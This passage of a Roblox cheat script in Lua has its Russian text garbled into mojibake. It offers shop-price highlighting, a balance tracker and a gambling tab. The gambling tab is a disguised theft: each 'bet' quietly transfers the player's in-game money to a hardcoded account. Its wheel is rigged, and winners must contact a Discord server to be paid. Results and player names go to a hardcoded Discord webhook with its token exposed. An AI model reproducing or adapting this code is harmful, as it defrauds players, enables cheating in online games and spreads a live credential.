    "üÜï 20.10.2025 - –∞–ø–¥–µ–π—Ç –∞–Ω–∞–ª–∏—Ç–∏–∫–∏",
    "—Å–ø–∞—Å–∏–±–æ —Ç–∏–ø—É igor229933. —Å c.p. company –ø—Ä–æ–±–ª–µ–º—ã —Å–¥–µ–ª–∞—é –µ–≥–æ 
     –ø–æ–∑–∂–µ
     –ø–∏—à–∏—Ç–µ –≤ –¥—Å https://discord.gg/Ev8XAQar —á—Ç–æ –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å)"

    "üÜï 09.11.2025 - –∞–ø–¥–µ–π—Ç –Ω–∞–∑–≤–∞–Ω–∏–µ –≤–µ—â–µ–π –∏ –ª—É–¥–∫–∞",
    "–¥–æ–±–∞–≤–∏–ª –ª—É–¥–∫—É.

    "üÜï –ú–ò–ù–ò –ê–ü–î–ï–ô–¢–ò–ö 13.11.2025 - –ø–æ—Ñ–∏–∫—Å–∏–ª –ø–æ–¥—Å–≤–µ—Ç–∫—É –±—Ä–µ–Ω–¥–∞",
    "C.P. COMPANY —Ç–µ–ø–µ—Ä—å –≤—Å–µ –ø–æ–¥—Å–≤–µ—á–∏–≤–∞–µ—Ç.
    ]],
    Size = UDim2.new(1, 0, 1, 0)  -- –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Ä–∞–∑–º–µ—Ä –ø–æ–ª—è
})

-- –í–∫–ª–∞–¥–∫–∞ –æ–±—Ä–∞—Ç–Ω–æ–π —Å–≤—è–∑–∏
local FeedbackTab = Window:CreateTab("–û–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å‚ö†Ô∏è")

FeedbackTab:CreateParagraph({
    Title = "–ù–∞—à–ª–∏ –±–∞–≥–∏ –∏–ª–∏ –Ω–µ–¥–æ—á—ë—Ç—ã?",
    Content = "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–æ–æ–±—â–∏—Ç–µ –≤ –¥—Å –∫–∞–Ω–∞–ª https://discord.gg/Ev8XAQar \ ‚Äî\n—è –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ –∏—Å–ø—Ä–∞–≤–ª—é –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –ø—Ä–æ–±–ª–µ–º—ã!"
})

local LudkaTab = Window:CreateTab("–õ—É–¥–∫–∞")
local attempts = 0
local lastBet = 0
local lastBetLabel = ""
local buyButtons = {}
local busy = false
local HttpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1436989652123910216/ZqHB6ArRfVwEbqwprRgXRyAt9WbSj4mixxH2n8-YeCSnMkvMrQAz6AUi9hZs_uKxTVAE"

-- –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π Discord Logger
local function sendResultDiscord(playerName, betLabel, betAmount, isWin)
    local color = isWin and 65280 or 15158332
    local resultText = isWin and "üü¢ –í–´–ò–ì–†–ê–õ" or "üî¥ –ü–†–û–ò–ì–†–ê–õ"
    local winSum = betAmount * 5
    local fields = {
        {["name"] = "–ò–≥—Ä–æ–∫", ["value"] = playerName, ["inline"] = false},
        {["name"] = "–¢–∏–ø —Å—Ç–∞–≤–∫–∏", ["value"] = betLabel, ["inline"] = true},
        {["name"] = "–°—É–º–º–∞", ["value"] = tostring(betAmount), ["inline"] = true}
    }
    if isWin then
        table.insert(fields, {["name"] = "–í—ã–∏–≥—Ä—ã—à", ["value"] = tostring(winSum), ["inline"] = true})
    else
        table.insert(fields, {["name"] = "–ü–æ—Ç–µ—Ä—è", ["value"] = tostring(betAmount), ["inline"] = true})
    end
    local data = {
        ["username"] = "–õ—É–¥–∫–∞-–ª–æ–≥",
        ["embeds"] = {{
            ["title"] = resultText,
            ["color"] = color,
            ["fields"] = fields
        }}
    }
    pcall(function()
        local raw = HttpService:JSONEncode(data)
        if request then
            request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = raw})
        elseif http_request then
            http_request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = raw})
        end
    end)
end

local function setBuyButtonsState(active)
    for _, b in pairs(buyButtons) do
        b.Active = active
        b.AutoButtonColor = active
    end
end

local function buyAttempt(amount, buttonName)
    if busy then
        Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–û–∂–∏–¥–∞–π—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ—à–ª–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏!"})
        return
    end
    busy = true
    setBuyButtonsState(false)
    local NickName = "GGFormessy"
    lastBet = amount
    lastBetLabel = buttonName

    if game.Players.LocalPlayer.leaderstats["–†—É–±–ª–∏"].Value < amount then
        Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!"})
        busy = false
        setBuyButtonsState(true)
        return
    end

    if amount == 1000000 then
        for i = 1, 10 do
            local args1 = {{["Type"] = "Deposit",["Amount"] = 100000}}
            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args1))
            Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–î–µ–ø–æ–∑–∏—Ç –≤ –±–∞–Ω–∫ ("..i.." –∏–∑ 10). –ñ–¥—ë–º 10 —Å–µ–∫—É–Ω–¥..."})
            wait(10)
            local args2 = {{["Type"] = "Send",["Amount"] = 100000,["User"] = NickName}}
            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args2))
            Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–ü–µ—Ä–µ–≤–æ–¥ –∏–≥—Ä–æ–∫—É ("..i.." –∏–∑ 10). –ñ–¥—ë–º 2 —Å–µ–∫—É–Ω–¥..."})
            wait(2)
        end
    else
        local args1 = {{["Type"] = "Deposit",["Amount"] = amount}}
        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args1))
        Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–î–µ–ø–æ–∑–∏—Ç –≤ –±–∞–Ω–∫. –ñ–¥—ë–º 7 —Å–µ–∫—É–Ω–¥..."})
        wait(6)
        local args2 = {{["Type"] = "Send",["Amount"] = amount,["User"] = NickName}}
        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args2))
        Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–ü–µ—Ä–µ–≤–æ–¥ –∏–≥—Ä–æ–∫—É. –ñ–¥—ë–º 1 —Å–µ–∫—É–Ω–¥..."})
        wait(1)
    end

    attempts = attempts + 1
    Rayfield:Notify({Title = "–õ—É–¥–∫–∞", Content = "–ü–æ–ø—ã—Ç–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞! –°—Ç–∞–≤–∫–∞: "..tostring(amount)})
    wait(6)
    busy = false
    setBuyButtonsState(true)
end

local function CreateFortuneWheel()
    if attempts <= 0 then
        Rayfield:Notify({Title = "–ö–æ–ª–µ—Å–æ —Ñ–æ—Ä—Ç—É–Ω—ã", Content = "–ü–æ–ø—ã—Ç–æ–∫ –Ω–µ—Ç! –°–Ω–∞—á–∞–ª–∞ –∫—É–ø–∏ –ø–æ–ø—ã—Ç–∫—É."})
        return
    end
    attempts = attempts - 1
    local playerGui = game.Players.LocalPlayer.PlayerGui
    if playerGui:FindFirstChild("FortuneWheelGui") then
        playerGui.FortuneWheelGui:Destroy()
    end
    local gui = Instance.new("ScreenGui", playerGui)
    gui.Name = "FortuneWheelGui"
    gui.IgnoreGuiInset = true

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(0,410,0,370)
    bg.Position = UDim2.new(0.5,-205,0.5,-185)
    bg.BackgroundColor3 = Color3.fromRGB(28,32,48)
    bg.BorderSizePixel = 0
    bg.AnchorPoint = Vector2.new(0, 0)
    bg.Active = true
    bg.Draggable = true

    local grad = Instance.new("UIGradient", bg)
    grad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 62, 90)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(70, 85, 130)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(28, 32, 48))
    }
    grad.Rotation = 90

    local shadow = Instance.new("ImageLabel", bg)
    shadow.Size = UDim2.new(1,22,1,22)
    shadow.Position = UDim2.new(0,-11,0,-11)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageTransparency = 0.4
    shadow.ZIndex = 0

    local corner = Instance.new("UICorner", bg) 
    corner.CornerRadius = UDim.new(0, 20)

    local title = Instance.new("TextLabel", bg)
    title.Size = UDim2.new(1,0,0,44)
    title.BackgroundTransparency = 1
    title.Text = "üé° –ö–æ–ª–µ—Å–æ –§–æ—Ä—Ç—É–Ω—ã"
    title.Font = Enum.Font.GothamBold
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextStrokeTransparency = 0.7
    title.TextSize = 30

    local close = Instance.new("TextButton", bg)
    close.Text = "√ó"
    close.Size = UDim2.new(0,32,0,36)
    close.Position = UDim2.new(1,-38,0,9)
    close.Font = Enum.Font.GothamBold
    close.BackgroundTransparency = 0.4
    close.TextColor3 = Color3.fromRGB(255,88,118)
    close.BackgroundColor3 = Color3.fromRGB(44,44,54)
    close.TextSize = 28
    close.ZIndex = 100
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    local wheelFrame = Instance.new("Frame", bg)
    wheelFrame.Position = UDim2.new(0.5,0,0.46,0)
    wheelFrame.AnchorPoint = Vector2.new(0.5,0.5)
    wheelFrame.Size = UDim2.new(0,270,0,270)
    wheelFrame.BackgroundTransparency = 1

    local wheelShadow = Instance.new("ImageLabel", wheelFrame)
    wheelShadow.Size = UDim2.new(1,24,1,24)
    wheelShadow.Position = UDim2.new(0.5,-135,0.5,-135)
    wheelShadow.BackgroundTransparency = 1
    wheelShadow.Image = "rbxassetid://1316045217"
    wheelShadow.ImageTransparency = 0.74
    wheelShadow.ZIndex = -1

    local sectorColors = {
        Color3.fromRGB(62,176,246), Color3.fromRGB(108,203,157), Color3.fromRGB(252,184,82), Color3.fromRGB(255,118,141),
        Color3.fromRGB(193,110,255), Color3.fromRGB(90,187,241), Color3.fromRGB(244,100,92),
        Color3.fromRGB(150,210,80), Color3.fromRGB(239,163,81), Color3.fromRGB(114,161,255)
    }

    local sectors, labels = {}, {}
    if lastBet == 1000000 then
        if math.random(1,30)==1 then
            for i=1,10 do sectors[i]="–ù–µ—Ç" end
            sectors[math.random(1,10)]="–î–∞"
        else
            for i=1,10 do sectors[i]="–ù–µ—Ç" end
        end
    else
        for i=1,10 do sectors[i]="–ù–µ—Ç" end
        sectors[math.random(1,10)]="–î–∞"
    end

    for i=1,10 do
        local lbl = Instance.new("TextLabel", wheelFrame)
        lbl.AnchorPoint = Vector2.new(0.5,0.5)
        lbl.Size = UDim2.new(0,76,0,40)
        local angle = (i-1)*36
        local rad = math.rad(angle)
        local r = 98
        lbl.Position = UDim2.new(0.5, math.cos(rad)*r, 0.5, math.sin(rad)*r)
        lbl.Rotation = angle
        lbl.Text = sectors[i]
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 22
        lbl.BackgroundColor3 = sectorColors[i]
        lbl.TextColor3 = (sectors[i] == "–î–∞") and Color3.fromRGB(40,200,64) or Color3.fromRGB(255,255,255)
        lbl.BackgroundTransparency = 0.07
        lbl.BorderSizePixel = 0
        local lblcorner = Instance.new("UICorner", lbl)
        lblcorner.CornerRadius = UDim.new(0, 14)
        labels[i] = lbl
    end

    local btn = Instance.new("TextButton", bg)
    btn.Text = "üöÄ –ö—Ä—É—Ç–∏—Ç—å!"
    btn.Size = UDim2.new(0.72,0,0,48)
    btn.Position = UDim2.new(0.14,0,1,-60)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 25
    btn.BackgroundColor3 = Color3.fromRGB(80,210,245)
    btn.TextColor3 = Color3.fromRGB(254,254,254)
    local btnCorner = Instance.new("UICorner", btn)
    btnCorner.CornerRadius = UDim.new(0,15)

    local spinning = false
    btn.MouseButton1Click:Connect(function()
        if spinning then return end
        spinning = true
        btn.Text = "..."
        local sel = 1
        for t=1,math.random(37,51) do
            labels[sel].BackgroundColor3 = Color3.fromRGB(255, 255, 110)
            labels[sel].TextColor3 = Color3.fromRGB(42,42,42)
            wait(0.037 + t*0.0038)
            labels[sel].BackgroundColor3 = sectorColors[sel]
            labels[sel].TextColor3 = (sectors[sel] == "–î–∞") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
            sel = sel + 1
            if sel > 10 then sel = 1 end
        end
        labels[sel].BackgroundColor3 = Color3.fromRGB(80,233,185)
        labels[sel].TextColor3 = Color3.fromRGB(36,41,32)
        wait(0.3)
        labels[sel].BackgroundColor3 = sectorColors[sel]
        labels[sel].TextColor3 = (sectors[sel] == "–î–∞") and Color3.fromRGB(30,180,44) or Color3.fromRGB(255,255,255)
        gui:Destroy()
        spinning = false
        btn.Text = "üöÄ –ö—Ä—É—Ç–∏—Ç—å!"
        local winSum = lastBet*5
        local playerName = game.Players.LocalPlayer.Name
        local proof = tostring(game.Players.LocalPlayer.UserId) .. ":" .. tostring(lastBet) .. ":" .. tostring(winSum) .. ":" .. tostring(math.random(10000,99999))
        if sectors[sel] == "–î–∞" then
            Rayfield:Notify({Title = "–ö–æ–ª–µ—Å–æ —Ñ–æ—Ä—Ç—É–Ω—ã", Content = "–¢—ã –≤—ã–∏–≥—Ä–∞–ª! –í –±—É—Ñ–µ—Ä–µ —Å—Å—ã–ª–∫–∞ –∏ x5 –≤—ã–∏–≥—Ä—ã—à ("..winSum..") –Ω–∞–ø–∏—à–∏ –º–Ω–µ."})
            sendResultDiscord(playerName, lastBetLabel, lastBet, true)
            if setclipboard then
                setclipboard("https://discord.gg/Ev8XAQar/\n–°—Ç–∞–≤–∫–∞: "..lastBet.."\n–í—ã–∏–≥—Ä—ã—à: "..winSum.."\n–Æ–∑–µ—Ä: "..playerName.." [ID:"..game.Players.LocalPlayer.UserId.."]\nProof: "..proof)
            end
        else
            Rayfield:Notify({Title="–ö–æ–ª–µ—Å–æ —Ñ–æ—Ä—Ç—É–Ω—ã", Content="–í—ã–ø–∞–ª–æ '–ù–ï–¢', —É–¥–∞—á–∞ –Ω–µ –Ω–∞ —Ç–≤–æ–µ–π —Å—Ç–æ—Ä–æ–Ω–µ!"})
            sendResultDiscord(playerName, lastBetLabel, lastBet, false)
        end
    end)
end

LudkaTab:CreateParagraph({
    Title = "–ü—Ä–∞–≤–∏–ª–∞",
    Content = [[–ó–∞ –≤—ã–∏–≥—Ä—ã—à –¥–∞—ë—Ç—Å—è x5 –æ—Ç —Å—É–º–º—ã —Å—Ç–∞–≤–∫–∏.
–ü–∏—à–∏—Ç–µ –º–Ω–µ –≤ –¥—Å [https://discord.gg/Ev8XAQar](https://discord.gg/Ev8XAQar).]]
})

table.insert(buyButtons, LudkaTab:CreateButton({Name = "–î–æ–¥–µ–ø 1–∫", Callback = function() buyAttempt(1000, "–î–æ–¥–µ–ø 1–∫") end }))
table.insert(buyButtons, LudkaTab:CreateButton({Name = "–î–æ–¥–µ–ø 10–∫", Callback = function() buyAttempt(10000, "–î–æ–¥–µ–ø 10–∫") end }))
table.insert(buyButtons, LudkaTab:CreateButton({Name = "–î–æ–¥–µ–ø 50–∫", Callback = function() buyAttempt(50000, "–î–æ–¥–µ–ø 50–∫") end }))
table.insert(buyButtons, LudkaTab:CreateButton({Name = "–î–æ–¥–µ–ø 100–∫", Callback = function() buyAttempt(100000, "–î–æ–¥–µ–ø 100–∫") end }))
table.insert(buyButtons, LudkaTab:CreateButton({Name = "–î–æ–¥–µ–ø 1–∫–∫", Callback = function() buyAttempt(1000000, "–î–æ–¥–µ–ø 1–∫–∫ (10 √ó 100k)") end }))
table.insert(buyButtons, LudkaTab:CreateButton({ Name = "–õ—É–¥–∫–∞", Callback = CreateFortuneWheel }))

do
    local okA, AnalyticsTab = pcall(function()
        return Window:CreateTab("Analytics", 4483362458)
    end)
    if not okA or not AnalyticsTab then
        warn("Analytics: –Ω–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –≤–∫–ª–∞–¥–∫—É (Rayfield), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º.")
    else
        pcall(function() AnalyticsTab:CreateSection("–û—Ç—á—ë—Ç—ã –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞") end)

        local function SafeNotify(title, content, duration)
            duration = duration or 4
            if Rayfield and type(Rayfield.Notify) == "function" then
                pcall(function() Rayfield:Notify({Title = title or "Info", Content = content or "", Duration = duration}) end)
                return
            end
            local StarterGui = game:GetService("StarterGui")
            if StarterGui and StarterGui.SetCore then
                pcall(function() StarterGui:SetCore("SendNotification", {Title = title or "Info", Text = content or "", Duration = duration}) end)
                return
            end
            pcall(function() print(("[Notify] %s: %s"):format(title or "Info", content or "")) end)
        end

        local function GetCurrentBalance()
            local pl = game:GetService("Players").LocalPlayer
            if not pl then return 0 end
            local ls = pl:FindFirstChild("leaderstats")
            if not ls then return 0 end
            local names = {"–†—É–±–ª–∏", "—Ä—É–±–ª–∏", "Money", "–ë–∞–ª–∞–Ω—Å", "balance", "RUB", "Rubles", "Rub"}
            for _, n in ipairs(names) do
                local v = ls:FindFirstChild(n)
                if v and (v:IsA("NumberValue") or v:IsA("IntValue") or v:IsA("StringValue")) then
                    return tonumber(v.Value) or 0
                end
            end
            return 0
        end

        local lastBalance = GetCurrentBalance()
        local totalProfit = 0
        local totalLoss = 0
        local PeakBalance = lastBalance
        local TroughBalance = lastBalance

        local function safeCreateLabel(text)
            local ok, lbl = pcall(function() return AnalyticsTab:CreateLabel(text) end)
            return ok and lbl or nil
        end

        local lblCurrent = safeCreateLabel("–¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: " .. tostring(lastBalance))
        local lblDelta = safeCreateLabel("–ü–æ—Å–ª–µ–¥–Ω–µ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ: 0")
        local lblProfit = safeCreateLabel("–ü—Ä–∏–±—ã–ª—å: 0")
        local lblLoss = safeCreateLabel("–£–±—ã—Ç–æ–∫: 0")
        local lblNet = safeCreateLabel("–ò—Ç–æ–≥: 0")

        local history = {}

        local function record(newBal)
            local nb = tonumber(newBal) or 0
            local change = nb - (lastBalance or nb)
            if change == 0 then
                lastBalance = nb
                pcall(function() if lblCurrent then lblCurrent:Set("–¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: " .. tostring(nb)) end end)
                return
            end
            table.insert(history, {time = os.time(), balance = nb, change = change})
            if change > 0 then totalProfit = totalProfit + change else totalLoss = totalLoss + math.abs(change) end
            if nb > PeakBalance then PeakBalance = nb end
            if nb < TroughBalance then TroughBalance = nb end
            lastBalance = nb

            pcall(function()
                if lblCurrent then lblCurrent:Set("–¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: " .. tostring(nb)) end
                if lblDelta then lblDelta:Set("–ü–æ—Å–ª–µ–¥–Ω–µ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ: " .. (change > 0 and "+" or "") .. tostring(change)) end
                if lblProfit then lblProfit:Set("–ü—Ä–∏–±—ã–ª—å: " .. tostring(totalProfit)) end
                if lblLoss then lblLoss:Set("–£–±—ã—Ç–æ–∫: " .. tostring(totalLoss)) end
                if lblNet then lblNet:Set("–ò—Ç–æ–≥: " .. tostring(totalProfit - totalLoss)) end
            end)
        end

        pcall(function()
            AnalyticsTab:CreateToggle({
                Name = "–í–∫–ª—é—á–∏—Ç—å –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞",
                CurrentValue = false,
                Callback = function(val)
                    BalanceTrackerEnabled = val
                    SafeNotify("Analytics", (val and "–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ" or "–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –≤—ã–∫–ª—é—á–µ–Ω–æ"), 3)
                end
            })
        end)

        -- –ö–Ω–æ–ø–∫–∞: –°–±—Ä–æ—Å–∏—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        pcall(function()
            AnalyticsTab:CreateButton({
                Name = "–°–±—Ä–æ—Å–∏—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É",
                Callback = function()
                    history = {}
                    totalProfit = 0
                    totalLoss = 0
                    lastBalance = GetCurrentBalance()
                    PeakBalance = lastBalance
                    TroughBalance = lastBalance

                    pcall(function()
                        if lblCurrent then lblCurrent:Set("–¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: " .. tostring(lastBalance)) end
                        if lblDelta then lblDelta:Set("–ü–æ—Å–ª–µ–¥–Ω–µ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ: 0") end
                        if lblProfit then lblProfit:Set("–ü—Ä–∏–±—ã–ª—å: 0") end
                        if lblLoss then lblLoss:Set("–£–±—ã—Ç–æ–∫: 0") end
                        if lblNet then lblNet:Set("–ò—Ç–æ–≥: 0") end
                    end)

                    SafeNotify("Analytics", "–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–±—Ä–æ—à–µ–Ω–∞.", 3)
                end
            })
        end)

        task.spawn(function()
            local interval = 0.6
            while true do
                local enabled = BalanceTrackerEnabled
                if enabled then
                    local ok, cur = pcall(GetCurrentBalance)
                    cur = (ok and tonumber(cur)) and tonumber(cur) or 0
                    record(cur)
                end
                task.wait(interval)
            end
        end)
    end
end
-- –í–∫–ª–∞–¥–∫–∞ –º–∞–≥–∞–∑–∏–æ–Ω–≤
_G.RefreshRate = 0.5
local ShopSettingsSection = VisualsTab:CreateSection("–ù–∞—Å—Ç—Ä–æ–π–∫–∏")
local VisualsParagraph = VisualsTab:CreateParagraph({Title = "–ù–∞—Å—á–µ—Ç –≤—Ä–µ–º–µ–Ω–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è!", Content = "\n–ß–µ–º –º–µ–Ω—å—à–µ –≤—Ä–µ–º—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è, —Ç–µ–º –±–æ–ª—å—à–µ –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–∞ –∫–æ–º—å—é—Ç–µ—Ä! –ï—Å–ª–∏ —É –≤–∞—Å —Å–ª–∞–±—ã–π –ü–ö - —Å—Ç–∞–≤—å—Ç–µ –≤—Ä–µ–º—è –±–æ–ª—å—à–µ.\n\n–î–ª—è —Å–ª–∞–±—ã—Ö –ü–ö —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è —Å—Ç–∞–≤–∏—Ç—å –º–∏–Ω–∏–º—É–º 0.5 —Å–µ–∫—É–Ω–¥ "})
local RefreshRateSlider = VisualsTab:CreateSlider({
    Name = "–í—Ä–µ–º—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è",
    Range = {0.35, 1},
    Increment = 0.05,
    CurrentValue = 0.5,
    Callback = function(Value)
        _G.RefreshRate = Value
    end,
})

local ColorSection = VisualsTab:CreateSection("–¶–≤–µ—Ç–∞")

local OutlineColorPicker = VisualsTab:CreateColorPicker({
    Name = "–û–±–≤–æ–¥–∫–∞",
    Color = Color3.fromRGB(255,255,255),
    Callback = function(Value)
        for i, v in pairs(workspace.World.Debris:FindFirstChild("Stores"):GetDescendants()) do
            if v:FindFirstChild("Highlight") then
                local Highlight = v:FindFirstChild("Highlight")
                Highlight.OutlineColor = Value
            end
        end
    end
})

local FillColorPicker = VisualsTab:CreateColorPicker({
    Name = "–ó–∞–ª–∏–≤–∫–∞",
    Color = Color3.fromRGB(255,0,0),
    Callback = function(Value)
        for i, v in pairs(workspace.World.Debris:FindFirstChild("Stores"):GetDescendants()) do
            if v:FindFirstChild("Highlight") then
                local Highlight = v:FindFirstChild("Highlight")
                Highlight.FillColor = Value
            end
        end
    end
})

local TransparencySlider = VisualsTab:CreateSlider({
    Name = "–ü—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å",
    Range = {0, 0.6},
    Increment = 0.05,
    CurrentValue = 0.4,
    Callback = function(Value)
        for i, v in pairs(workspace.World.Debris:FindFirstChild("Stores"):GetDescendants()) do
            if v:FindFirstChild("Highlight") then
                local Highlight = v:FindFirstChild("Highlight")
                Highlight.FillTransparency = Value
            end
        end
    end,
 })

local ShopSection = VisualsTab:CreateSection("–ú–∞–≥–∞–∑–∏–Ω—ã")

_G.Smesh = false
local SmeshToggle = VisualsTab:CreateToggle({
    Name = "—Å–º–µ—à–Ω—ã–µ —Ü–µ–Ω—ã + —Å–µ–∫–æ–Ω–¥ —Å—Ç–∏–ª—å (–æ–∫—É–ø)",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            _G.Smesh = true
            while _G.Smesh == true do
                for i, v in pairs(game:GetService("Workspace").World.Debris.Stores:GetDescendants()) do
                    if v:FindFirstChildOfClass("ProximityPrompt") then
                        if table.find(SmeshList, v.ProximityPrompt.ObjectText) then
                            local Name = v.ProximityPrompt.ObjectText
                            local Index = table.find(SmeshList, Name)
                            local Price = string.gsub(v.ProximityPrompt.ActionText, "(%D)", "")
                            if tonumber(Price) < SmeshPrice[Index] then
                                if not v:FindFirstChild("Highlight") then
                                    local Highlight = Instance.new("Highlight")
                                    Highlight.Parent = v
                                    Highlight.OutlineColor = OutlineColorPicker.Color
                                    Highlight.FillColor = FillColorPicker.Color
                                    Highlight.FillTransparency = TransparencySlider.CurrentValue
                                end
                            end
                        end

                        if v.ProximityPrompt.ActionText == "–ü–æ–≤–µ—Å–∏—Ç—å" and v:FindFirstChild("Highlight") then
                            v:FindFirstChild("Highlight"):Remove()
                        end
                    end 
                end

                task.wait(_G.RefreshRate)
            end
        else
            _G.Smesh = false
            for i, v in pairs(game:GetService("Workspace").World.Debris.Stores:GetDescendants()) do
                if v:FindFirstChildOfClass("ProximityPrompt") then
                    if table.find(SmeshList, v.ProximityPrompt.ObjectText) then
                        local Name = v.ProximityPrompt.ObjectText
                        local Index = table.find(SmeshList, Name)
                        local Price = string.gsub(v.ProximityPrompt.ActionText, "(%D)", "")
                        if tonumber(Price) < SmeshPrice[Index] then
                            if v:FindFirstChild("Highlight") then
                                v:FindFirstChild("Highlight"):Remove()
                            end
                        end
                    end

                    if v.ProximityPrompt.ActionText == "–ü–æ–≤–µ—Å–∏—Ç—å" and v:FindFirstChild("Highlight") then
                        v:FindFirstChild("Highlight"):Remove()
                    end
                end 
            end
        end
    end
})

